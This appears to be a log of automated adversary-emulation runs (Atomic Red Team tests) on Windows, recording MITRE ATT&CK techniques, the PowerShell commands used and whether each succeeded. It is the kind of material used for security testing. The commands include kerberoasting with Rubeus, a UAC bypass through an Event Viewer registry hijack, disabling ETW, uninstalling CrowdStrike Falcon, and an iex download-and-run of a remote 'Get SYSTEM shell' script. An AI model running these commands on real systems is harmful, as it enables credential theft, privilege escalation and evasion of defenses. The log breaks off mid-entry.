------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__eedc7881da4d2fddb5c56fb96aaeecfd__trial_1

atomic_ordering: ['eedc7881da4d2fddb5c56fb96aaeecfd']
------------------------------
{'ability_id': 'eedc7881da4d2fddb5c56fb96aaeecfd',
 'agent_reported_time': '2023-11-11T13:08:45Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.003',
            'technique_name': 'Steal or Forge Kerberos Tickets: Kerberoasting'},
 'command': 'klist purge; cmd.exe /c '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" '
            'kerberoast None '
            '/outfile:"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt"',
 'delegated': '2023-12-03T06:59:24Z',
 'description': "Information on the Rubeus tool and it's creators found here: "
                'https://github.com/GhostPack/Rubeus#asreproast\n'
                'This build targets .NET 4.5.  If targeting a different '
                'version you will need to compile Rubeus\n',
 'executor': 'psh',
 'link_id': '5a360bfd-1dc8-4729-b862-bdae26fe256a',
 'name': 'Rubeus kerberoast',
 'pid': 4768,
 'plaintext_command': 'klist purge; cmd.exe /c '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" '
                      'kerberoast None '
                      '/outfile:"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt"',
 'platform': 'windows',
 'run': '2023-12-03T06:59:40Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218__defense-evasion__signed_binary_proxy_execution__7802ee02cf34e0e7cbee64ee22a79b8d__trial_1

atomic_ordering: ['7802ee02cf34e0e7cbee64ee22a79b8d']
==============================
==============================
adversary_id: atomic__t1112__defense-evasion__modify_registry__6722535bf5a14b87b5772b739f53321f__trial_1

atomic_ordering: ['6722535bf5a14b87b5772b739f53321f']
------------------------------
{'ability_id': '6722535bf5a14b87b5772b739f53321f',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1112',
            'technique_name': 'Modify Registry'},
 'command': 'New-ItemProperty '
            '"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet '
            'Settings" -Name T1112 -Value "<script>"',
 'delegated': '2023-11-29T23:54:39Z',
 'description': 'Upon execution, a javascript block will be placed in the '
                'registry for persistence.\n'
                'Additionally, open Registry Editor to view the modified entry '
                'in '
                'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet '
                'Settings.\n',
 'executor': 'psh',
 'link_id': 'f2d54e47-6937-4cd9-bb8f-262b43d744ce',
 'name': 'Javascript in registry',
 'pid': 3792,
 'plaintext_command': 'New-ItemProperty '
                      '"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet '
                      'Settings" -Name T1112 -Value "<script>"',
 'platform': 'windows',
 'run': '2023-11-29T23:55:09Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1548_002__multiple__abuse_elevation_control_mechanism-_bypass_user_account_control__7440c68b83b6d728b4111d083facefec__trial_1

atomic_ordering: ['7440c68b83b6d728b4111d083facefec']
------------------------------
{'ability_id': '7440c68b83b6d728b4111d083facefec',
 'agent_reported_time': '2023-11-11T13:10:30Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1548.002',
            'technique_name': 'Abuse Elevation Control Mechanism: Bypass User '
                              'Account Control'},
 'command': 'New-Item '
            '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" -Force; '
            'Set-ItemProperty '
            '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" -Name '
            '"(default)" -Value "C:\\Windows\\System32\\cmd.exe" -Force; '
            'Start-Process "C:\\Windows\\System32\\eventvwr.msc"',
 'delegated': '2023-12-02T10:53:54Z',
 'description': 'PowerShell code to bypass User Account Control using Event '
                'Viewer and a relevant Windows Registry modification. More '
                'information here - '
                'https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n'
                'Upon execution command prompt should be launched with '
                'administrative privalages\n',
 'executor': 'psh',
 'link_id': '62c67a63-1831-447a-90f4-21d7b77dcb12',
 'name': 'Bypass UAC using Event Viewer (PowerShell)',
 'pid': 8432,
 'plaintext_command': 'New-Item '
                      '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" '
                      '-Force; Set-ItemProperty '
                      '"HKCU:\\software\\classes\\mscfile\\shell\\open\\command" '
                      '-Name "(default)" -Value '
                      '"C:\\Windows\\System32\\cmd.exe" -Force; Start-Process '
                      '"C:\\Windows\\System32\\eventvwr.msc"',
 'platform': 'windows',
 'run': '2023-12-02T10:54:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_006__defense-evasion__impair_defenses-_indicator_blocking__8beb34c915b17873e357c030d517be0a__trial_1

atomic_ordering: ['8beb34c915b17873e357c030d517be0a']
------------------------------
{'ability_id': '8beb34c915b17873e357c030d517be0a',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.006',
            'technique_name': 'Impair Defenses: Indicator Blocking'},
 'command': 'New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework '
            '-Name ETWEnabled -Value 0 -PropertyType "DWord" -Force',
 'delegated': '2023-12-03T17:37:32Z',
 'description': 'Disables ETW for the .NET Framework using PowerShell to '
                'update the Windows registry',
 'executor': 'psh',
 'link_id': '490747ca-a1dc-47be-955a-499676eb8114',
 'name': 'Disable .NET Event Tracing for Windows Via Registry (powershell)',
 'pid': 8972,
 'plaintext_command': 'New-ItemProperty -Path '
                      'HKLM:\\Software\\Microsoft\\.NETFramework -Name '
                      'ETWEnabled -Value 0 -PropertyType "DWord" -Force',
 'platform': 'windows',
 'run': '2023-12-03T17:38:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1564_003__defense-evasion__hide_artifacts-_hidden_window__f1222384fe40cc71e7dea9d182014eaf__trial_1

atomic_ordering: ['f1222384fe40cc71e7dea9d182014eaf']
------------------------------
{'ability_id': 'f1222384fe40cc71e7dea9d182014eaf',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1564.003',
            'technique_name': 'Hide Artifacts: Hidden Window'},
 'command': 'Start-Process powershell.exe -WindowStyle hidden calc.exe',
 'delegated': '2023-12-03T18:54:45Z',
 'description': 'Launch PowerShell with the "-WindowStyle Hidden" argument to '
                'conceal PowerShell windows by setting the WindowStyle '
                'parameter to hidden.\n'
                'Upon execution a hidden PowerShell window will launch '
                'calc.exe\n',
 'executor': 'psh',
 'link_id': 'd6288794-6147-40e8-9860-4266b5794020',
 'name': 'Hidden Window',
 'pid': 7784,
 'plaintext_command': 'Start-Process powershell.exe -WindowStyle hidden '
                      'calc.exe',
 'platform': 'windows',
 'run': '2023-12-03T18:54:49Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1114_003__collection__email_collection-_email_forwarding_rule__e947c2f5e248a8bbfe0e26b5bf688109__trial_1

atomic_ordering: ['e947c2f5e248a8bbfe0e26b5bf688109']
==============================
==============================
adversary_id: atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__7179bb4957f1f7f3004ea70c714a8fb9__trial_1

atomic_ordering: ['7179bb4957f1f7f3004ea70c714a8fb9']
------------------------------
{'ability_id': '7179bb4957f1f7f3004ea70c714a8fb9',
 'agent_reported_time': '2023-11-11T13:09:57Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.012',
            'technique_name': 'Hijack Execution Flow: COR_PROFILER'},
 'command': '$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '
            "'{09108e71-974c-4010-89cb-acf471ae9e2c}'; $env:COR_PROFILER_PATH "
            '= \'"83f016_T1574.012x64.dll"\'; POWERSHELL -c \'Start-Sleep 1\'',
 'delegated': '2023-12-04T02:40:47Z',
 'description': 'Creates process scope environment variables to enable a .NET '
                'profiler (COR_PROFILER) without making changes to the '
                'registry. The unmanaged profiler DLL (`T1574.012x64.dll`) '
                'executes when the CLR is loaded by PowerShell.\n'
                '\n'
                'Reference: '
                'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
 'executor': 'psh',
 'link_id': 'a6e16851-bf88-4030-9b79-6e0ac84989c0',
 'name': 'Registry-free process scope COR_PROFILER',
 'pid': 1576,
 'plaintext_command': '$env:COR_ENABLE_PROFILING = 1; $env:COR_PROFILER = '
                      "'{09108e71-974c-4010-89cb-acf471ae9e2c}'; "
                      '$env:COR_PROFILER_PATH = \'"83f016_T1574.012x64.dll"\'; '
                      "POWERSHELL -c 'Start-Sleep 1'",
 'platform': 'windows',
 'run': '2023-12-04T02:40:59Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1218_007__defense-evasion__signed_binary_proxy_execution-_msiexec__29d32b9096933705ce0fffc441283b20__trial_1

atomic_ordering: ['29d32b9096933705ce0fffc441283b20']
------------------------------
{'ability_id': '29d32b9096933705ce0fffc441283b20',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.007',
            'technique_name': 'Signed Binary Proxy Execution: Msiexec'},
 'command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'delegated': '2023-12-01T00:42:21Z',
 'description': 'Executes an MSI containing an embedded DLL using the WMI '
                'Win32_Product class\n',
 'executor': 'psh',
 'link_id': '1cfcb1b1-57d6-4a70-a61e-11ebe630a997',
 'name': 'WMI Win32_Product Class - Execute Local MSI file with an embedded '
         'DLL',
 'pid': 10992,
 'plaintext_command': 'Invoke-CimMethod -ClassName Win32_Product -MethodName',
 'platform': 'windows',
 'run': '2023-12-01T00:43:15Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__8aabc61664e947c69058c3df4f3af860__trial_1

atomic_ordering: ['8aabc61664e947c69058c3df4f3af860']
------------------------------
{'ability_id': '8aabc61664e947c69058c3df4f3af860',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': 'if (Test-Path '
            '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else '
            '{New-Item -Type Directory (split-path '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
            '-ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  '
            '$env:USERNAME -message "Enter password for $env:USERNAME to use '
            'during password change attempt"; $cred.Password | '
            'ConvertFrom-SecureString | Out-File '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  '
            '$credFile = '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if '
            '(Test-Path $credFile) {;     $cred = New-Object -TypeName '
            'System.Management.Automation.PSCredential -ArgumentList '
            '$env:USERNAME, (Get-Content $credFile | '
            'ConvertTo-SecureString);     '
            'if($cred.GetNetworkCredential().Password -eq '
            '"UpperLowerLong-special"){;       Write-Host -ForegroundColor '
            'Yellow "The new password is the same as the password stored in '
            'the credential file. Please specify a different new password."; '
            'exit -1;     };     try {;         $newPassword = '
            'ConvertTo-SecureString UpperLowerLong-special -AsPlainText '
            '-Force;         Set-ADAccountPassword -Identity $env:USERNAME '
            '-OldPassword $cred.password -NewPassword $newPassword;     };     '
            'catch { ;         $_.Exception;         $errCode = '
            '$_.Exception.ErrorCode;         Write-Host "Error code: '
            '$errCode";         if ($errCode -eq 86) {;             Write-Host '
            '-ForegroundColor Yellow "The stored password for the current user '
            'is incorrect. Please run the prereq commands to set the correct '
            'credentials";             Remove-Item $credFile;         '
            '};         exit $errCode;     };     Write-Host -ForegroundColor '
            'Cyan "Successfully changed the password to '
            'UpperLowerLong-special";     $newCred = New-Object '
            'System.Management.Automation.PSCredential ($env:USERNAME, '
            '$(ConvertTo-SecureString "UpperLowerLong-special" -AsPlainText '
            '-Force));     $newCred.Password | ConvertFrom-SecureString | '
            'Out-File $credFile; }; else {;     Write-Host -ForegroundColor '
            'Yellow "You must store the password of the current user by '
            'running the prerequisite commands first"; }',
 'delegated': '2023-11-29T14:53:06Z',
 'description': 'Attempt to change the password of the current domain user in '
                'order to check password policy. Ideally, you would only run '
                'this atomic test to verify that your password policy is '
                'blocking the use of the new password.\n'
                'If the password is succesfully changed to the new password, '
                'the credential file will be updated to reflect the new '
                'password. You can then run the atomic manually and specify a '
                'new password of your choosing, however the\n'
                'password policy will likely prevent you from setting the '
                'password back to what it was. \n',
 'executor': 'psh',
 'link_id': 'e4a35aa6-38c7-45a1-a7d1-ec18c5486527',
 'name': 'Domain Password Policy Check: No Number in Password',
 'pid': 5244,
 'plaintext_command': 'if (Test-Path '
                      '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { '
                      '; } else {New-Item -Type Directory (split-path '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
                      '-ErrorAction Ignore | Out-Null; $cred = Get-Credential '
                      '-UserName  $env:USERNAME -message "Enter password for '
                      '$env:USERNAME to use during password change attempt"; '
                      '$cred.Password | ConvertFrom-SecureString | Out-File '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  '
                      ';  $credFile = '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; '
                      'if (Test-Path $credFile) {;     $cred = New-Object '
                      '-TypeName System.Management.Automation.PSCredential '
                      '-ArgumentList $env:USERNAME, (Get-Content $credFile | '
                      'ConvertTo-SecureString);     '
                      'if($cred.GetNetworkCredential().Password -eq '
                      '"UpperLowerLong-special"){;       Write-Host '
                      '-ForegroundColor Yellow "The new password is the same '
                      'as the password stored in the credential file. Please '
                      'specify a different new password."; exit -1;     };     '
                      'try {;         $newPassword = ConvertTo-SecureString '
                      'UpperLowerLong-special -AsPlainText -Force;         '
                      'Set-ADAccountPassword -Identity $env:USERNAME '
                      '-OldPassword $cred.password -NewPassword '
                      '$newPassword;     };     catch { ;         '
                      '$_.Exception;         $errCode = '
                      '$_.Exception.ErrorCode;         Write-Host "Error code: '
                      '$errCode";         if ($errCode -eq 86) {;             '
                      'Write-Host -ForegroundColor Yellow "The stored password '
                      'for the current user is incorrect. Please run the '
                      'prereq commands to set the correct '
                      'credentials";             Remove-Item '
                      '$credFile;         };         exit $errCode;     };     '
                      'Write-Host -ForegroundColor Cyan "Successfully changed '
                      'the password to UpperLowerLong-special";     $newCred = '
                      'New-Object System.Management.Automation.PSCredential '
                      '($env:USERNAME, $(ConvertTo-SecureString '
                      '"UpperLowerLong-special" -AsPlainText -Force));     '
                      '$newCred.Password | ConvertFrom-SecureString | Out-File '
                      '$credFile; }; else {;     Write-Host -ForegroundColor '
                      'Yellow "You must store the password of the current user '
                      'by running the prerequisite commands first"; }',
 'platform': 'windows',
 'run': '2023-11-29T14:53:13Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__f50ec080343f1bec4e739dd20675c349__trial_1

atomic_ordering: ['f50ec080343f1bec4e739dd20675c349']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1055_001__multiple__process_injection-_dynamic-link_library_injection__c1392878b0e39a2060e7e1b70e5a580b__trial_1

atomic_ordering: ['c1392878b0e39a2060e7e1b70e5a580b']
------------------------------
{'ability_id': 'c1392878b0e39a2060e7e1b70e5a580b',
 'agent_reported_time': '2023-11-11T13:09:53Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055.001',
            'technique_name': 'Process Injection: Dynamic-link Library '
                              'Injection'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
 'delegated': '2023-11-28T00:30:31Z',
 'description': 'Get SYSTEM shell - Bind System Shell using UsoClient DLL load '
                'technique via function of WinPwn',
 'executor': 'psh',
 'link_id': '1cfd31c1-168a-496b-8655-f0d34b86e00c',
 'name': 'WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL '
         'load technique',
 'pid': 7216,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
 'platform': 'windows',
 'run': '2023-11-28T00:30:42Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1018__discovery__remote_system_discovery__13a0c78dbd8d3645db69540bfe7cd038__trial_1

atomic_ordering: ['13a0c78dbd8d3645db69540bfe7cd038']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1083__discovery__file_and_directory_discovery__abc280f400f218aa1f4d5efe3c9e8228__trial_1

atomic_ordering: ['abc280f400f218aa1f4d5efe3c9e8228']
------------------------------
{'ability_id': 'abc280f400f218aa1f4d5efe3c9e8228',
 'agent_reported_time': '2023-11-11T13:10:00Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1083',
            'technique_name': 'File and Directory Discovery'},
 'command': 'Start-Process '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe"; '
            'Start-Sleep -Second 4; Stop-Process -Name "DirLister"',
 'delegated': '2023-11-29T04:36:02Z',
 'description': 'Launches the DirLister executable for a short period of time '
                'and then exits.\n'
                '\n'
                'Recently seen used by [BlackCat '
                'ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) '
                'to create a list of accessible directories and files.',
 'executor': 'psh',
 'link_id': 'cd711e2c-8439-4e9d-9353-f409a3a703af',
 'name': 'Launch DirLister Executable',
 'pid': 9236,
 'plaintext_command': 'Start-Process '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe"; '
                      'Start-Sleep -Second 4; Stop-Process -Name "DirLister"',
 'platform': 'windows',
 'run': '2023-11-29T04:36:11Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1531__impact__account_access_removal__c3f187080c141397bf8af092c44697a7__trial_1

atomic_ordering: ['c3f187080c141397bf8af092c44697a7']
==============================
==============================
adversary_id: atomic__t1046__discovery__network_service_discovery__114ad8aad10ca59e6a10b655764d749a__trial_1

atomic_ordering: ['114ad8aad10ca59e6a10b655764d749a']
------------------------------
{'ability_id': '114ad8aad10ca59e6a10b655764d749a',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1046',
            'technique_name': 'Network Service Discovery'},
 'command': 'python "53b103_T1046.py" -i 127.0.0.1',
 'delegated': '2023-11-27T17:47:29Z',
 'description': 'Scan ports to check for listening ports with python\n',
 'executor': 'psh',
 'link_id': 'd4f1ec00-50c8-4951-83d6-add0784196b5',
 'name': 'Port Scan using python',
 'pid': 708,
 'plaintext_command': 'python "53b103_T1046.py" -i 127.0.0.1',
 'platform': 'windows',
 'run': '2023-11-27T17:47:44Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1018__discovery__remote_system_discovery__f32d25602b6c142d321b9a0965316916__trial_1

atomic_ordering: ['f32d25602b6c142d321b9a0965316916']
------------------------------
{'ability_id': 'f32d25602b6c142d321b9a0965316916',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1018',
            'technique_name': 'Remote System Discovery'},
 'command': 'Get-AdComputer -Filter *',
 'delegated': '2023-11-27T08:23:48Z',
 'description': 'The following Atomic test will utilize Get-AdComputer to '
                'enumerate Computers within Active Directory.\n'
                'Upon successful execution a listing of Computers will output '
                'with their paths in AD.\n'
                'Reference: '
                'https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n',
 'executor': 'psh',
 'link_id': 'b3e0ff2b-82bd-4949-b348-33fed3f86800',
 'name': 'Enumerate Active Directory Computers with Get-AdComputer',
 'pid': 9748,
 'plaintext_command': 'Get-AdComputer -Filter *',
 'platform': 'windows',
 'run': '2023-11-27T08:24:04Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__3d628a543cd195d2a19b89b76a8e5d74__trial_1

atomic_ordering: ['3d628a543cd195d2a19b89b76a8e5d74']
------------------------------
{'ability_id': '3d628a543cd195d2a19b89b76a8e5d74',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe '
            'userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt"',
 'delegated': '2023-11-29T06:13:03Z',
 'description': 'Enumerates active directory usernames using the userenum '
                'function of Kerbrute',
 'executor': 'psh',
 'link_id': '22aac7b5-9d6c-4bd8-a743-5b9e6767344d',
 'name': 'Kerbrute - userenum',
 'pid': 9672,
 'plaintext_command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; '
                      '.\\kerbrute.exe userenum -d $env:USERDOMAIN --dc '
                      '$env:UserDnsDomain '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt"',
 'platform': 'windows',
 'run': '2023-11-29T06:13:12Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_001__defense-evasion__signed_binary_proxy_execution-_compiled_html_file__4c378a952a9235b7aba7f273f3cf4874__trial_1

atomic_ordering: ['4c378a952a9235b7aba7f273f3cf4874']
------------------------------
{'ability_id': '4c378a952a9235b7aba7f273f3cf4874',
 'agent_reported_time': '2023-11-11T13:10:09Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.001',
            'technique_name': 'Signed Binary Proxy Execution: Compiled HTML '
                              'File'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath '
            'Test.chm',
 'delegated': '2023-11-30T18:34:19Z',
 'description': 'Executes a CHM file simulating a user double click.',
 'executor': 'psh',
 'link_id': 'd9911564-ca1a-44b9-b6a3-909711f49690',
 'name': 'Invoke CHM Simulate Double click',
 'pid': 3240,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHCompiledHelp '
                      '-SimulateUserDoubleClick -CHMFilePath Test.chm',
 'platform': 'windows',
 'run': '2023-11-30T18:35:05Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1036_003__defense-evasion__masquerading-_rename_system_utilities__d9c1b1283c1ad6fdda27be021c4737d3__trial_1

atomic_ordering: ['d9c1b1283c1ad6fdda27be021c4737d3']
------------------------------
{'ability_id': 'd9c1b1283c1ad6fdda27be021c4737d3',
 'agent_reported_time': '2023-11-11T13:10:13Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1036.003',
            'technique_name': 'Masquerading: Rename System Utilities'},
 'command': 'copy "1db90b_T1036.003.exe" ($env:TEMP + "\\svchost.exe"); try { '
            '$myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + '
            '"\\svchost.exe")).Id }; catch { $_; exit $_.Exception.HResult}; '
            'Stop-Process -ID $myT1036_003',
 'delegated': '2023-11-27T15:28:42Z',
 'description': 'Copies an exe, renames it as a windows exe, and launches it '
                'to masquerade as a real windows exe\n'
                '\n'
                'Upon successful execution, powershell will execute '
                'T1036.003.exe as svchost.exe from on a non-standard path.\n',
 'executor': 'psh',
 'link_id': 'a0c3245b-7d3e-42c8-9215-c91af255a00f',
 'name': 'Masquerading - non-windows exe running as windows exe',
 'pid': 7704,
 'plaintext_command': 'copy "1db90b_T1036.003.exe" ($env:TEMP + '
                      '"\\svchost.exe"); try { $myT1036_003 = (Start-Process '
                      '-PassThru -FilePath ($env:TEMP + "\\svchost.exe")).Id '
                      '}; catch { $_; exit $_.Exception.HResult}; Stop-Process '
                      '-ID $myT1036_003',
 'platform': 'windows',
 'run': '2023-11-27T15:28:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__2e9acde621e7768a73c1b9a1157c444d__trial_1

atomic_ordering: ['2e9acde621e7768a73c1b9a1157c444d']
------------------------------
{'ability_id': '2e9acde621e7768a73c1b9a1157c444d',
 'agent_reported_time': '2023-11-11T13:10:11Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'if (Test-Path "C:\\ProgramData\\Package '
            'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe") '
            '{. "C:\\ProgramData\\Package '
            'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe" '
            '/repair /uninstall /quiet } else { Get-ChildItem -Path '
            '"C:\\ProgramData\\Package Cache" -Include "WindowsSensor.exe" '
            '-Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath '
            '$_.FullName); if ($sig.Status -eq "Valid" -and '
            '$sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . '
            '"$_" /repair /uninstall /quiet; break;}}}',
 'delegated': '2023-12-03T09:13:49Z',
 'description': 'Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path '
                'is not provided as an argument we need to search for it. '
                'Since the executable is located in a folder named with a '
                'random guid we need to identify it before invoking the '
                'uninstaller.\n',
 'executor': 'psh',
 'link_id': 'b9e18f38-975f-403d-a02e-d862e4717819',
 'name': 'Uninstall Crowdstrike Falcon on Windows',
 'pid': 8972,
 'plaintext_command': 'if (Test-Path "C:\\ProgramData\\Package '
                      'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe") '
                      '{. "C:\\ProgramData\\Package '
                      'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe" '
                      '/repair /uninstall /quiet } else { Get-ChildItem -Path '
                      '"C:\\ProgramData\\Package Cache" -Include '
                      '"WindowsSensor.exe" -Recurse | % { '
                      '$sig=$(Get-AuthenticodeSignature -FilePath '
                      '$_.FullName); if ($sig.Status -eq "Valid" -and '
                      '$sig.SignerCertificate.DnsNameList -eq "CrowdStrike, '
                      'Inc.") { . "$_" /repair /uninstall /quiet; break;}}}',
 'platform': 'windows',
 'run': '2023-12-03T09:14:34Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1201__discovery__password_policy_discovery__8c4228fa7e1c015590d1f13d935e5bb8__trial_1

atomic_ordering: ['8c4228fa7e1c015590d1f13d935e5bb8']
------------------------------
{'ability_id': '8c4228fa7e1c015590d1f13d935e5bb8',
 'agent_reported_time': '2023-11-11T13:09:43Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1201',
            'technique_name': 'Password Policy Discovery'},
 'command': 'get-addefaultdomainpasswordpolicy',
 'delegated': '2023-11-30T13:42:39Z',
 'description': 'The following Atomic test will utilize '
                'get-addefaultdomainpasswordpolicy to enumerate domain '
                'password policy.\n'
                'Upon successful execution a listing of the policy implemented '
                'will display.\n'
                'Reference: '
                'https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n',
 'executor': 'psh',
 'link_id': '31bd4f3d-7c59-42b4-a90d-2aa7aeac9e6d',
 'name': 'Enumerate Active Directory Password Policy with '
         'get-addefaultdomainpasswordpolicy',
 'pid': 7444,
 'plaintext_command': 'get-addefaultdomainpasswordpolicy',
 'platform': 'windows',
 'run': '2023-11-30T13:42:57Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1518__discovery__software_discovery__beafe61e6874eb9eec2119bd12255193__trial_1

atomic_ordering: ['beafe61e6874eb9eec2119bd12255193']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1112__defense-evasion__modify_registry__d2f6cb279552f1b65a9805d63eed1689__trial_1

atomic_ordering: ['d2f6cb279552f1b65a9805d63eed1689']
------------------------------
{'ability_id': 'd2f6cb279552f1b65a9805d63eed1689',
 'agent_reported_time': '2023-11-11T13:10:14Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1112',
            'technique_name': 'Modify Registry'},
 'command': 'New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
            '-Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 '
            '-Force; New-ItemProperty '
            '"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" '
            '-Name EnableLinkedConnections -PropertyType DWord -Value 1 '
            '-Force; New-ItemProperty '
